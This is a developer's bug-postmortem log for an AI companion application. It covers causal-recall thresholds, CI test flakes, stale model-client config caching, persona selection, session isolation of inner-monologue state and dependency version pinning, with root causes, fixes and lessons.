**Root cause:** The `depth_recall._causal_relevance` vector-matching fallback was too loose — `ev_server_down` (“故障持续三小时…”) vs the target node 「发布事故」 scored cosine **0.402**, clearing the 0.35 admission line; meanwhile `_recall_events` semantic scores had only two buckets `0/0.5`, and `_incremental_update` linked any corroboration event with **no causal gate whatsoever**.

**Fix (depth_recall.py):**
1. `_recall_events` gains a **corroboration admission threshold** `CAUSAL_MIN_EVENT_RELEVANCE=0.35`: events without sufficient causal association must not masquerade as causal corroboration
2. `_incremental_update` gains a **link guard**: events with `_causal_relevance < 0.35` do not enter the causal graph
3. `_causal_relevance` uses the injected `self._graph` (instead of the `CausalGraph.get_instance()` singleton — production-equivalent, more stable in tests)

**Verification:** Server events no longer appear in delay-scenario corroboration; covered by unit test `test_incremental_update_no_causal_relevance_skipped`.

**Takeaway:** "Semantically related" ≠ "causally related". Corroborating events must be backed by **explicit links or lexical evidence**; pure semantic similarity must not pose as causal corroboration; and write-side side effects (linking) need their own independent gate — never rely on "it made it into the result list".

---

## 42. Explicit-attribution guard over-kills same-chain events (backend)

**Symptom:** After adding matrix scenarios, `deep_recall("新功能上线后为什么出现回归")` missed the corroborating event `ev_regression` (linked to the 「功能回归」 node, same causal chain as the anchor 「新功能上线」 but outside the target set).

**Root cause:** The "explicit-attribution guard" introduced in §41 (if all of an event's explicit links lie outside the target set → return 0) was **one-size-fits-all** — it also wrongly killed same-chain downstream events: the anchor set contained only `{n_feature}`; `ev_regression` belongs to `n_regression`, not in the set → 0.

**Fix:** The guard changed to **graph-connectivity judgment**: if an event's owning node is 1-hop adjacent to the target set (same causal chain, `_node_connected_to_set`), it is treated as same-chain relevant and no longer zero-scored; same-chain relevance receives a **base score of `0.4 + 0.6×signal`** (same tier as direct hits, modulated by vector/text signal). Isolated nodes (e.g., 「补丁发布」) still return 0, leaving cross-scenario protection intact.

**Verification:** `ev_regression` causal relevance went 0.000 → 1.000 and recalls normally; `ev_patch_day` remains excluded. Added unit test `test_causal_relevance_connected_assignment`.

**Takeaway:** Deciding "irrelevant" from "not in the set" is **ill-considered** — in a causal graph, neighbors outside the set may still be same-chain relevant. Negative judgments must rest on **graph structure** (connectivity), not **set membership**.

---

## 43. Single-node causal-chain noise and repetitive flooding (backend/display)

**Symptom:** Deep-recall output contained many **single-node chains** (e.g., `人手不足 (85%)` — no arrows, no visible relationship to the anchor), and the same chain appeared multiple times (e.g., 「人手不足」 twice); provenance chains were joined with `←`, which read confusingly.

**Root cause:** `causal_tree.trace_up/trace_down`'s `path_nodes` **excluded the starting node** — a single hop of causality returned only one predecessor; `deep_recall` called `trace_up` for the anchor + each neighbor, and identical chains produced from different entry points were not deduplicated.

**Fix (depth_recall.py):**
- After collecting chains, **restore the anchor**: append the anchor at the tail of provenance chains and prepend it at the head of prediction chains → a single hop of causality displays the complete path 「人手不足 → 项目延期」
- **Deduplicate** by node sequence
- Display unified to cause→effect order joined by ` → ` (`DeepRecallResult.format` / `result_fusion.format_deep_recall_result` / `_build_conclusion`)

**Verification:** Causal chains went from "6 single-node chains (with duplicates)" to "3 complete paths (deduplicated)"; conclusion 「核心链路: 人手不足 → 项目延期」. Related display assertions updated accordingly.

---

## 44. Random CI full-suite flake — `set_event_loop(None)` residual pollution (testing)

**Symptom:** CI full runs (`pytest tests`, random order) intermittently hit `test_screen_router_ext.py::test_merge_vision_sync_no_running_loop` reporting `RuntimeError: There is no current event loop in thread 'MainThread'`; standalone/per-directory runs all passed; could not be reproduced locally.

**Root cause:** `test_model_runner_ext.py::test_reject_session_user_responses` ends with `asyncio.set_event_loop(None)` **without restoring** the prior loop. On Python 3.13, `asyncio.get_event_loop_policy().get_event_loop()` raises RuntimeError outright when no current loop exists (it no longer implicitly creates one). Under random order, if the polluting test lands before `test_screen_router_ext`, it fires.

**Fix:**
- Pollution source: save and restore the previous event loop (handling the 3.13 no-loop case via `except RuntimeError → old=None`); no longer leaves `set_event_loop(None)` behind
- Victim: `test_screen_router_ext` likewise saves the old loop, tolerant via `RuntimeError → None`

**Verification:** Both files + 381 related tests pass; the pollution mechanism was verified locally (after `set_event_loop(None)`, `get_event_loop_policy().get_event_loop()` reliably raises).

**Lesson:** Any test that "switches away" a global singleton (event loop, sys.modules, env vars) **must restore it**, and the restoration code must account for Python version behavior differences (3.13 no longer implicitly creates loops).

---

## 45. Random CI full-suite flake — `/tools` route assertion (testing, root cause not reproduced)

**Symptom:** CI full runs intermittently hit `test_api_main.py::test_register_module_routers_includes_all` reporting `AssertionError: /tools` (no `/tools` route present after `register_module_routers` mounting); standalone/HEAD/per-directory runs all passed.

**Root cause:** Not reproducible locally. `infra.tool_manager.api`'s `router` is **statically defined** (`APIRouter(prefix="/tools")` plus many fixed endpoints) with no conditional registration anywhere; checked pollution avenues such as `sys.modules` re-import and `include_router`/`tool_router` replacement, all without result. Inferred to be the same class as §44 — global-state pollution under random order; pollution source pending reproduction.

**Handling:** Added a **diagnostic guard** before the assertion: `assert tool_router.routes` (yielding the explicit message "router was re-imported or polluted"), so a recurrence can be located immediately rather than surfacing a vague `/tools missing`.

**Follow-up:** If CI hits it again, locate the pollution source from the diagnostic info; a local `tests/unit` full run of 5834 passing serves as the baseline.


---

## 40. Frontend cannot reach backend: IPv6 localhost trap + test blind spot in the frontend proxy layer (frontend/backend)

**Symptom:** Clicking features on the frontend page showed "waiting for backend to start"; the desktop pet/frontend process then exited. Backend `curl :8080/health` was fine, but the frontend's polling of `/api/health` kept failing.

**Root cause (two):**
1. **IPv6 `localhost` trap**: the `frontend/server.py` proxy used `http://localhost:{port}` — on macOS `localhost` resolves to `::1` (IPv6), while the backend binds only `127.0.0.1` (IPv4, `--host 127.0.0.1`) → urllib went IPv6 → **502**. `curl` prefers IPv4, so direct tests of 8080 looked fine, misdirecting the investigation.
2. **Frontend port fixed and out of sync**: server.py pinned `BACKEND_URL` at startup; after a backend port fallback/restart it drifted; cortex launching the backend also never wrote the port-discovery file.

**Fix:**
1. Proxy switched to explicit `127.0.0.1` (IPv4), mirrored in `pet_widget.py`
2. Proxy **dynamically reads** `read_backend_port()` on every request (frontend follows port changes)
3. cortex writes the port-discovery file via `save_backend_port` when starting the backend

**Verification:** `8765/api/health` went from 502 → 200.

**Test blind spot (why it wasn't caught):** `frontend/server.py` (the Python proxy layer) previously had **zero tests**, and:
- pytest tested only `tests/` (backend); vitest tested only JS — the Python proxy layer was "unclaimed"
- The module coverage checklist `_PRODUCTION_DIRS` excluded `frontend` → the "full coverage" proof only covered the backend
- IPv6 localhost is runtime resolution behavior; unit tests connecting directly to 127.0.0.1 never trigger it

**Blind-spot fix:** Added `tests/unit/test_frontend_server.py` (10 cases: IPv4 regression, dynamic port, /api stripping, error passthrough); the coverage checklist now includes `frontend/` (server.py/pet_widget.py, Qt GUI launcher exempt).

**Lesson:** Every piece of Python code must have **explicit test ownership** and be listed in the coverage checklist — it cannot leave the test regime just because "the directory belongs to the frontend". Environment-class bugs (DNS/IPv6 resolution) require explicitly mocked behavior in tests.

---

## 46. Model client caches stale config → changing API URL/Key has no effect (backend/missing hot-reload)

**Symptom:** After the user changed the model API URL/Key on the settings page, **chat kept requesting the old URL** (404), yet **psychological activity could use the new config**; only restarting the backend took effect.

**Root cause:**
- `chat_light/ModelRunner.client` (model_runner.py:22-24) and `ContextSlicer._get_client` lazily build once and **cache** the `LargeModelClient` instance
- Clients built before a config change hold the old `api_url/api_key` and keep being reused → requests go to the old address
- Psychological activity **creates a new** `SmallModelClient` on every think (continuous_thinker.py:77-80) → reads the latest settings → hence takes effect immediately. The inconsistent behaviors exposed the "cached stale config" problem
- Settings-page save (`update_config`) only updates **in-memory running settings + rebuilds model_factory instances**, but chat_light's independent client cache is not governed by the factory

**Fix (config-fingerprint hot reload, no restart needed):**
- New `infra/model/config_fingerprint.py`: `model_config_fingerprint(tier)` returns a URL/Key/name/format fingerprint; `close_client_session()` closes the old aiohttp session
- `ModelRunner.client` / `ContextSlicer._get_client`: compare fingerprints on each fetch; rebuild the client on change
- `PromptComposer`: hot-reloads identity based on `base.yaml` mtime (prompt edits take effect immediately)

**Similar-issue sweep (class A: lazily cached clients unaware of config changes):** searched the whole repo for `XxxModelClient()` construction sites — 3 total:
1. `chat_light/ModelRunner.client` → fixed
2. `chat_light/ContextSlicer._get_client` → fixed
3. `desktop_pet/pet_engine._build_messages` (desktop pet lazily caching LargeModelClient) → **also given config-fingerprint-based rebuilding this round** (pet_engine.py)

All other clients either create fresh instances per call (psychological activity/values evolution `SmallModelClient(...)` news on demand) or are managed centrally by `model_factory` (`update_config` triggers `reload_from_config()` to rebuild) — no such problem.

**Verification:** Added `tests/unit/test_config_hot_reload.py` (fingerprint change/reuse, ModelRunner rebuild, ContextSlicer rebuild, base.yaml hot reload); 119 related tests pass.

**Note:** Only a settings-page save (`update_config`, updating memory) takes effect immediately; **directly editing the `~/.cortex/settings.json` file** still requires a restart (`_load_user_config` reads only once at process start).

**Lesson:** Every "lazily built and cached" model/external client must sense config changes (fingerprint/version number), otherwise user config edits get "swallowed" by the cache. Diagnostic heuristic: **the same kind of call where some sites create anew each time while others cache and reuse** is the signature of this bug class.

---

## 47. Pure-chat persona ignores orchestration active status → disabled agent's persona force-applied (backend)

**Symptom:** On the orchestration page the user disabled the custom agent `123` and activated `orchestrator`, but pure-chat mode still force-applied `123`'s custom persona (“芙宁娜”), and editing other prompts "had no effect" either.

**Root cause:** `chat_light/prompt_composer.build_system` hardcodes pure-chat persona selection:
```python
custom_persona = get_persona("orchestrator")
if not custom_persona:
    for ca in get_custom_agents():
        if ca.get("tier") == "large" and ca.get("role"):
            custom_persona = get_persona(ca["role"])  # 取“第一个” large agent
            if custom_persona: break
```
**Ignoring `get_agent_active()`** — even if the user disabled an agent in orchestration, as long as it was "the first large custom agent" it got applied. The user's expectation of "the enabled one is the one used" was overridden by hardcoded priority.

**Fix (prompt_composer.py):** Respect orchestration active status; select only from activated agents:
1. `orchestrator` active and having a custom persona → priority
2. Otherwise → persona of the **activated** large-tier custom agent (filtered via `get_agent_active(role)`)
3. Otherwise → built-in `base.yaml` identity
(The advanced `persona_override` remains highest — explicit user setting.)

**Verification:** Under the user's real config (`agent_active={'orchestrator': True, '123': False}`), `build_system` changed from "the Furina persona" to the built-in "Your name is Cortex.". Added 3 tests covering (disabled not applied / activated takes priority / advanced override highest).

**Why it wasn't caught earlier (test blind spots):**
1. Existing tests mocked `get_persona`/`get_custom_agents`/`get_system_override` but **never mocked `get_agent_active`** → real default `True` applied (settings.py `active_map.get(role, True)`) → every mocked agent was "active by default"
2. There were only **positive tests** ("who wins selection") and **no negative tests** ("who should be excluded") — the disabled branch was never covered
3. The user's real scenario (`active_map` explicitly written as `False`) never appeared in tests

**Lesson:** Tests must not mock only the methods they care about while letting other logic consume real defaults — defaults mask branch bugs. **State branches** produced by real user operations (disable/activate) require explicit negative tests.

---

## 48. Similar-issue sweep: systematic audit of hardcoded persona selection / config caching

**Background:** After §47 fixed "pure chat ignoring orchestration active", swept the whole repo against those two root-cause pattern classes.

**Class B (hardcoded persona picking / ignoring active status):**
| Location | Conclusion |
|---|---|
| `core/model_runner.py:2451` ModelRunnerManager.start_runner | ✅ **Already correct** — checks `get_agent_active()` at startup; disabled agents are refused |
| `chat_light/prompt_composer.build_system` | ⚠️ Was hardcoded to take the first large agent → **fixed** (§47) |
| `identity.py` merging custom agents into roles | ✅ Supplies templates to start_runner; the scheduling layer already blocks disabled ones; no force-application |
| `management/api.py` / `api/main.py` read/display | ✅ Read-only status; no selection logic |

Conclusion: Class B had a single leak in chat_light, now fixed; agent-mode scheduling respects active by design.

**Class C (caching makes config changes ineffective):**
| Location | Conclusion |
|---|---|
| `identity.get_identities()` caching `_merged_identities` | ⚠️ Directly editing personas.yaml does not reload; but `set_custom_agent`/`delete_custom_agent` call `_invalidate_identity_cache` — settings-page operations are live; falls into the "editing files requires restart" class (noted in §46) |

**Verification:** 119 related tests pass.

---

## 49. Psychological-activity (conscience) dialog cache accumulates across sessions (backend)

**Symptom:** User reported "after switching sessions, the actually injected context didn't change but kept accumulating". Session-scoped dialog-history isolation checked out fine, yet **psychological activity** (inner monologue) still referenced other sessions' dialog.

**Root cause:** `Conscience` is a **global singleton** (`get_conscience()`); its dialog cache `_last_dialog_buffer` is **instance-level, not partitioned by session** (conscience.py:70-78):
```python
def add_to_dialog(self, role, text):       # 无 session 参数
    self._last_dialog_buffer.append(...)    # 所有会话共用一个 buffer
```
`think()` takes `recent_dialog = self._last_dialog_buffer[-6:]` → after switching to a new session, the psychological activity's "recent dialog" is still the old session's, accumulating across sessions. Same class as §47: "singleton state not isolated by session".

(For contrast: `_get_causal_knowledge`/`_get_node_ids_from_events` already isolated event retrieval by `owner_id`; only the dialog buffer was missed.)

**Fix (conscience.py):** Dialog cache made **session-isolated**:
- `_last_dialog_buffer` → `_dialog_buffers: Dict[str, list]` (owner_id/session_id → buffer)
- `add_to_dialog(role, text, session_id="large_primary")`: default value keeps backward compatibility with old calls
- `think()`'s `recent_dialog` and internal `add_to_dialog("assistant", ...)` both fetch the corresponding buffer by `owner_id`
- The `continuous_thinker.py` call site passes `session_id`

**Verification:** Added `test_add_to_dialog_session_isolated` (different sessions never accumulate into each other), updated 3 old assertions to the new attribute; 155 related tests pass.

**Diagnostic signal:** "A feature is a global singleton + holds instance-level mutable state (list/dict) caches" while that state ought to be session-isolated — `add_to_dialog` lacking a session parameter is the tell. Similar case: the global event memories injected by `_recall_memories`【things that happened】are also a cross-session accumulation source (designed as cross-session experience reuse; add a switch later if strict isolation is needed).



## 50. Causal graph doesn't follow memory libraries → causal knowledge pollutes across libraries (backend)

**Symptom:** After switching memory libraries, the event store (EventStore/FAISS) switches along with the library, but the causal graph remains globally shared (`data/causal.db`) — causal knowledge distilled from different personas/systems' memory libraries contaminate each other; deep recall corroborates library B's events using library A's causal chains.

**Root cause:** `switch_memory_lib` (settings.py) switches only the three event-store paths `MEMORY_DB_PATH / MEMORY_FAISS_INDEX / MEMORY_ID_MAP`, **not `CAUSAL_DB_PATH`**; the `CausalGraph` global singleton is pinned to `data/causal.db`, and `_reset_memory_singletons` doesn't reset the causal-graph singleton either.

**Fix (causal graph follows the memory library):**
- Each memory library gets its own causal-graph path: `lib["causal"] = data/causal_{safe}.db` (same directory as the event store, name derived from it)
- `get_memory_libs` default library, `create_memory_lib`, and `delete_memory_lib` default-rebuild all carry the `causal` field
- `switch_memory_lib` / `_apply_current_memory_lib` (at startup) also set `CAUSAL_DB_PATH`, **backward compatible with old libraries** (when the causal field is missing, derive it from the library name and write back memory_libs.json)
- `_reset_memory_singletons` resets `CausalGraph._instance`; after a switch, it reloads under the new path

**Verification:** Added 5 tests (causal-path switching / old-library derivation compatibility / creation carries causal / startup application / CausalGraph singleton reset); 403 related tests pass.

**Lesson:** "Multiple isolated stores" (memory libraries) must **replicate the full isolation dimension** — isolating only the event store while omitting the causal graph/vector index/singletons lets seemingly isolated systems cross-contaminate at the reasoning layer. Audit point: do **all** path-style configs of an isolated library + related singletons switch together?

## 51. Psychological activity displays chain-of-thought instead of inner monologue (backend)

**Symptom:** Psychological activity (inner monologue) output turned into long stretches of chain-of-thought — "The user asked me to recall past experience… let me organize my wording… drafting: … let me double-check…" — instead of a short parenthesis-wrapped monologue.

**Root cause (two layers):**
1. **`max_tokens=500` too small**: thinking-type (Reasoner) models (deepseek-v4-flash) emit a long chain-of-thought before producing the formal monologue. The psychological-activity prompt contains causal knowledge + dialog history; once model thinking exceeded 500 tokens it was truncated mid-thought → `content` came back empty.
2. **`small_model_client.generate`'s reasoning fallback treated chain-of-thought as output**: `if not content and "reasoning_content" in message: content = reasoning` (small_model_client.py:186-189) — when content was empty, the entire chain-of-thought was returned as the formal output.

Measured: for psychological-activity requests, in the normal case `content` is a clean "(I remember…)" monologue (500→128 chars, 1500→149 chars); only when thinking was truncated (content empty) did the reasoning fallback kick in and expose the chain-of-thought.

**Fix:**
- `conscience.think`: `max_tokens` 500 → **1500** (enough headroom for thinking so formal content gets produced)
- All three model clients' `generate()` reasoning fallbacks changed to `fallback_to_reasoning: bool = False`, **off by default**:
  - `small_model_client.generate`, `large_model_client.generate`, `medium_model_client.generate`
  - The thinking process (chain-of-thought) **must never masquerade as formal output** — empty content returns empty and the caller degrades; only rare scenarios explicitly passing `True` that treat chain-of-thought as the deliverable get the fallback
  - Repo-wide confirmation of **no non-test caller passing True**; the streaming path (large chat_stream) already correctly separates `reasoning_content` into the thinking area

**Verification:** Updated the three clients' default-behavior tests (`test_reasoning_not_used_by_default` / `test_generate_does_not_use_reasoning_by_default`) + explicit-True tests; 299 related tests pass.

**Lesson:** The thinking process and formal output are **two independent channels** — `content` is the deliverable, `reasoning_content` is the process; **never mix them**. On truncation/error, prefer returning empty and letting the caller degrade over stuffing chain-of-thought into formal output; "fallbacks" must default to off and enable only via explicit opt-in.

---

## 41. Psychological-activity box disappears after switching sessions — mental events not persisted (frontend/backend)

**Symptom:** After switching session windows on the frontend, the "psychological activity" box disappears (that session's mental-activity records are invisible).

**Root cause:** Psychological activity (`msg_type='mental'`, conscience inner monologue) was previously **pushed live over WS only, never persisted** (`push_content(persist=False)`, designed to avoid polluting AI context) — after a session switch, history loading contained no mental messages → the box was empty.

**Fix:**
1. Backend: `multi_model_orchestrator` persists psychological activity as `role="mental"` (`persist=True`); `api_stream` filters out `mental` when restoring context (like thought, keeping model input unpolluted)
2. Frontend: `chat.js` renders `role="mental"` → `kind:'mental'` psychological-activity box when loading session history (consistent with live events)

**Verification:** Backend 212 passed + frontend chat store 27 passed; mental persisted as `role="mental"` and filtered on context restore.

**Note:** In `chat_gateway`, conscience's segment-by-segment mentals (streaming-token intermediate states) remain unpersisted — the main psychological activity (the orchestrator-integrated inner monologue) is now persisted and visible.

## 52. CI test-failure triage: missing PyQt6 environment + tests depending on real user config (testing/environment)

**Symptom:** CI (ubuntu, Python 3.11) failed 3 items on full runs:
- `test_frontend_server.py::test_pet_widget_*` (2 items) — `ModuleNotFoundError: No module named 'PyQt6'`
- `test_api_main.py::test_register_module_routers_includes_all` — `AssertionError: /tools` (historical flaky, §45, diagnostic guard already added)

**Root cause 1 (missing PyQt6 environment):** `frontend/pet_widget.py` has a top-level `from PyQt6.QtCore import ...`, but `requirements.txt`/`pyproject.toml` **lack PyQt6** — local macOS has it installed so local passes; CI ubuntu doesn't → importing pet_widget fails in tests. The tests only read `BACKEND_URL` (port discovery) and never instantiate Qt.

**Fix:** `tests/conftest.py` gains a session autouse fixture `mock_pyqt6_if_missing` — when PyQt6 is unavailable, inject a MagicMock module tree into `sys.modules` (QtCore/QtGui/QtWebChannel/QtWebEngineCore/QtWebEngineWidgets/QtWidgets) so pet_widget imports normally; real environments (PyQt6 present locally) are not mocked. Verified: pet_widget imports successfully in a PyQt6-less environment and BACKEND_URL is correct.

**Root cause 2 (conscience attribute renamed without syncing integration tests):** When the psychological-activity dialog cache became `_dialog_buffers` (§49), only `tests/unit/test_conscience_ext.py` was updated; `tests/integration/test_conscience.py` still referenced `_last_dialog_buffer` → AttributeError.

**Fix:** Synced integration tests to `_dialog_buffers`.

**Root cause 3 (reasoning-fallback default flipped to False without syncing all tests):** When `fallback_to_reasoning` defaulted to False (§51), only `test_large_model_client_ext.py` / `test_small_model_client_ext.py` / `test_medium_model_client.py` were updated, missing `test_model_client_chat.py::test_generate_reasoning_fallback`.

**Fix:** Synced that test (default: no chain-of-thought returned + explicit-True fallback).

**Root cause 4 (prompt_composer tests depending on real personas.yaml):** After the pure-chat persona started respecting orchestration active (§47), composer tests in `test_chat_light_prompt.py` / `test_chat_light_ext.py` **didn't mock `get_agent_active`** → they depended on the orchestration state of the user's real `~/.cortex/personas.yaml` (whether orchestrator is active); any user config change made them flaky — precisely a recurrence of §47's lesson "tests consuming real defaults".

**Fix:** Related tests mock `Settings.get_agent_active` (made deterministic), no longer depending on real user config.

**Verification:** 226 related tests pass; `pytest tests/unit` full run passes (all of the PyQt6-mock / conscience / reasoning / get_agent_active fixes effective).

**Lesson:** ① When tests import modules under test, missing desktop/native dependencies (PyQt6 etc.) must be uniformly mocked in conftest — never rely on "it happens to be installed locally"; ② when changing internal attributes/defaults, search globally for all references (integration tests included); ③ any test reading real user config files (personas.yaml/settings.json) must mock the read layer, otherwise user config edits make it flaky.

## 53. Config-fingerprint rebuild constructs a real client in test environments → `API key 不能为空` (backend/testing)

**Symptom:** CI failed 6 items with `ValueError: API key 不能为空` (test_config_hot_reload / test_pet_engine / test_pet_engine_ext); passed locally, always failed on CI.

**Root cause (two layers):**
1. **Explicitly injected client overwritten by fingerprint rebuild**: the test sets `pe._client = _real_client()` (api_key="t"), but in the fingerprint logic `if _client is None or _client_cfg != cfg`, `_client_cfg` is None (test never recorded it) → `None != cfg` → rebuilt as a **parameterless** `LargeModelClient()` → reads settings' LARGE_MODEL_API_KEY (CI has no `.env`/`~/.cortex/settings.json` → empty) → raises `ValueError: API key 不能为空`. Local passes thanks to the user's key; CI without a key always fails.
2. **Module-level from-import defeats test mocks**: `ModelRunner`'s module top does `from infra.model.large_model_client import LargeModelClient`; once bound, `monkeypatch.setattr("infra.model.large_model_client.LargeModelClient", ...)` changes only the source module's attribute — the reference bound inside ModelRunner is untouched → mock ineffective → real construction → same error.

**Fix (ModelRunner.client / pet_engine._build_messages):**
- Refactored the fingerprint judgment into three branches: `_client is None` → lazy-build; `_client_cfg is None` (explicit injection) → **record fingerprint only, no rebuild**; `_client_cfg != cfg` → rebuild
- Client construction switched to an **in-function import** `from infra.model.large_model_client import LargeModelClient` — fetched from the source module each time, so patching the source-module attribute takes effect
- Synced `test_model_runner_client_lazy`'s patch path to the source module

**Verification:** 287 related tests pass; in no-API-key environments explicitly injected clients are no longer overwritten and mocks work properly.

**Lesson:** ① "Lazy-build cache + config-fingerprint rebuild" must **respect explicit injection** (`_client_cfg` being missing ≠ needs rebuilding — it may simply be an externally supplied instance); ② module-level `from X import Y` binds Y into this namespace, so mocking the source module's attribute has no effect — **you must import inside the function or access via module reference** for patches to apply.

## 54. CI `/tools` route assertion failure — fastapi 0.141 lazy `_IncludedRouter` (testing)

**Symptom:** On CI (ubuntu/Python 3.11), `test_api_main.py::test_register_module_routers_includes_all` fails consistently with `AssertionError: /tools`; locally (3.13) it never fails. Diagnostics: tool_router routes=17 non-empty, include_router is the pristine method, app.router normal, but `app.routes` held only default routes (/docs etc.) plus one `''`; manual include also "failed".

**Root cause: fastapi version behavior change (not pollution):**
- In **fastapi 0.141+** (CI installs `fastapi>=0.104.1` → latest 0.141), `include_router` **no longer expands APIRoute immediately**; it wraps them in a lazy `fastapi.routing._IncludedRouter` (which itself has no `.path`; actual routes live in `original_router.routes`)
- The test judged routes via `getattr(r, "path", "")` → `_IncludedRouter` lacks `.path` → yields `''` → assertion reports `/tools` missing
- Local fastapi 0.135.2 exhibits the **expanding** behavior → test passes. Reproduced locally in a 3.11 venv installing 0.141.1, confirming a version difference

**Fix (tests/unit/test_api_main.py):**
- Added `_collect_route_paths(routes)`: recursively expands `_IncludedRouter.original_router.routes` to collect real paths, compatible with fastapi 0.135 (expansion) and 0.141+ (lazy wrapping)
- `test_register_module_routers_includes_all` / `test_register_module_routers_skips_difference_when_disabled` switched to this helper

**Verification:** `/tools` test passes under the 3.11 venv (fastapi 0.141.1, matching CI); 120 items pass locally on 3.13.

**Lesson:** Web-framework version upgrades can alter "seemingly stable" behaviors (include_router expanding → lazy wrapping). Path assertions over `app.routes` must use **recursive collection** (compatible with wrappers like `_IncludedRouter`/`Mount`), never assuming every route object has `.path`; and fastapi version differences between local and CI mask such problems — **always verify under the same Python/dependency versions as CI**.

## 55. Dependency version drift — CI installs latest, local stays old (`>=` pins nothing)

**Background:** §54's `/tools` failure root-caused to a fastapi 0.141 behavior change (lazy `_IncludedRouter`), while local 0.135.2 retains the old behavior. Why do CI/local versions diverge?

**Root cause:** `requirements.txt` uses `fastapi>=0.104.1` (lower bound only, no upper bound):
- **CI**: brand-new environment each run; `pip install -r` installs current latest (0.141.1)
- **Local**: the pre-existing 0.135.2 satisfies `>=0.104.1`; pip doesn't upgrade → stays old
- Net effect: CI/local dependency-version drift → framework behavior changes surface on CI but can never be reproduced locally

**Fix (pin versions):**
- `requirements.txt`: `fastapi>=0.104.1` → `fastapi==0.141.1` (pinned to the verified version, with a comment explaining why)
- Tests already tolerate both include_router behaviors, 0.135 (expansion) / 0.141 (lazy wrapping) (§54), so even if the pin is loosened later nothing brittle breaks

**Verification:** Behavior consistent after unifying local/CI on fastapi 0.141.1; §54's tests pass under 0.141.1.

**Lesson:** `>=` constraints naturally drift in "fresh-install-every-time" scenarios (CI/deployment/new machines) — **CI lands on latest while old environments stay old**, turning any framework behavior change into "CI red, local green". Core web/runtime dependencies should be **pinned with `==`** (or use a lock file), validating CI and local against identical versions.

---

## 42. Environment perception not injected into the LLM context — dd1ee8b refactor regression (backend)

**Symptom:** Under agent mode (model_runner) and pure chat (chat_light), the model's system prompt lacked 【环境感知】 — the perception system ran (window/screen/OCR) but the model saw no environment.

**Root cause:** The `dd1ee8b` (2026-06-27) refactor of the "context and prompt systems" **removed the orchestrator's `get_context_summary()` perception-injection call**; the post-refactor mechanism (`PerceptionSource`→`PerceptionPool`) wired into only desktop pet / continuous thinking (core) / proactive talk, **not into `model_runner` (agent) nor `chat_light` (pure chat)** — perception injection thereby broken for about 2 months.

**Fix:**
1. At the `model_runner._build_system_prompt_for_mode` call site: `PerceptionSource().collect()` → append the 【环境感知】 block
2. `chat_light/continuous_thinker`: likewise append 【环境感知】 after the psychological-activity injection
3. Both wrapped in try/except tolerance (uninitialized perception/exceptions never break normal conversation)

**Verification:** Both injections effective (mock PerceptionSource → system_prompt contains environment perception); added `test_perception_injection.py` (4 cases); 266 related passed.

**Lesson:** After large refactors (context/prompt systems), regression must cover the complete "data→prompt" chain; problems like perception where "the collection side works but the injection side is severed" are hard to catch in code review — injection-chain tests are needed.

## 56. Persona has two storage sources + feedback-loop node set not session-isolated (backend)

**Symptom:** User edits the persona on the orchestration/settings page; the chat system prompt updates but **psychological activity (inner monologue) does not** — mental activity still uses the roles.yaml built-in template. Also: under multi-session concurrency, the psychological activity's feedback loop (analyze_feedback adjusting causal-graph confidence) may consume **other sessions'** causal nodes.

**Root cause (two):**
1. **Two persona sources**: chat uses `personas.yaml` (get_persona, user-customized; core-mode composer.py:139 also overrides via get_persona), while psychological activity uses the built-in `config/prompts/roles.yaml` (conscience._resolve_role reads roles.yaml directly) — editing one leaves the other untouched.
2. **`conscience._last_analyzed_node_ids` is global-singleton mutable state** (same class as §49): concurrent multi-session thinks overwrite each other; analyze_feedback (fire-and-forget async) may adjust causal-graph confidence using the wrong session's nodes.

**Fix:**
- Added a unified persona entry `settings.get_role_persona(role)`: user-customized `personas.yaml personas[role]` → custom agent (personality+style+strengths) → `roles.yaml` built-in → empty. `conscience._build_role_context` switched to it — **chat and psychological activity share one source, so editing one persona affects both** (psychological activity still consumes only the persona text, without the tools section)
- `_compose_persona` tolerates expertise as a comma-separated string (split into a list)
- Feedback-loop node set isolated by session: at think end, snapshot the round's nodes into `_pending_feedback_by_session[session_id]`; `analyze_feedback(owner_id=session_id)` uses that session's snapshot and cleans up afterwards; direct calls (tests) fall back to `_last_analyzed_node_ids` (backward compatible)

**Memory safety:**
- `Conscience` gains `clear_session()` / `clear_all_dialogs()` (release dialog caches when sessions are deleted, preventing unbounded growth)
- Added `tests/leak/test_leak_conscience_dialogs.py` (per-session bounded at 20 entries + sessions clearable + massive sessions clearable wholesale) and `tests/leak/test_leak_client_rebuild.py` (on client config-fingerprint rebuild, the old aiohttp session is closed, preventing leaks)

**Verification:** 8 unified-persona defensive tests + feedback-pool isolation tests + 12 leak items + 329 related pass.

**Lesson:** ① "Edit a persona once, effective in both places" demands a unified read entry (user-customized first + built-in fallback) instead of letting each consumer read its own source; ② mutable state on global singletons (even transient "this round's analyzed nodes") crosses wires under multi-session concurrency — **snapshotting per session** is the standard solution; ③ newly introduced bounded/clearable state (dialog cache) must ship with cleanup methods + leak tests.

---

## 43. File-perception feature effectively dead — collection-to-consumer pipeline severed (backend)

**Symptom:** After modifying files in the project root, the perception pool still reported "no perception data currently" — file changes never entered model context.

**Root cause:** `FileDifferenceSource.detect()` only produced `Difference` objects (for detector storage/high-intensity callbacks), **never publishing FILE_CHANGE perception events**; the perception pool subscribed to `FILE_CHANGE` but **had no publisher whatsoever**. Moreover, `file_modified` intensity 25 < threshold 50, so high_intensity callbacks wouldn't fire either. The pipeline between the collector (detecting differences) and the consumer (perception pool→model) was severed.

**Why tests missed it (systematic blind spot):**
- Unit tests verified each component correct in isolation: `detect()` returns Difference ✓ / detector registration ✓ / integration formatting ✓ — but **nobody tested the inter-component "data pipeline" (who turns Difference into published perception events)**
- The module coverage checklist proved only "got imported/executed", not "data reached the consumer"
- Same pattern family as §42 (perception-injection consumer side severed) — here the producer side was severed too

**Handling:** Removed the file-perception feature (the collector side never had a genuine publisher; the pipeline was incomplete):
- Deleted the `FileDifferenceSource` module + `test_file_source_ext.py`
- Detector registration removed; integration's FILE_CHANGE subscription/formatting removed
- settings dropped `PERCEPTION_FILE_ENABLED`; the frontend settings page dropped the file-monitoring switch
- Related mock tests updated (test_difference_detector / test_perception_integration_ext)

**Recurrence prevention:** Add an end-to-end perception-data pipeline test (real event publication → perception pool → collect → assert content); any "collection fine but pipeline severed" case gets caught.

## 57. Thinking-mode tool loop reports 400: assistant message doesn't return reasoning_content (backend)

**Symptom:** The code supervisor (code_supervisor) errored during multi-turn tool calls:
`400 - The reasoning_content in the thinking mode must be passed back to the API.` (provider: Console Go / DeepSeek thinking mode)

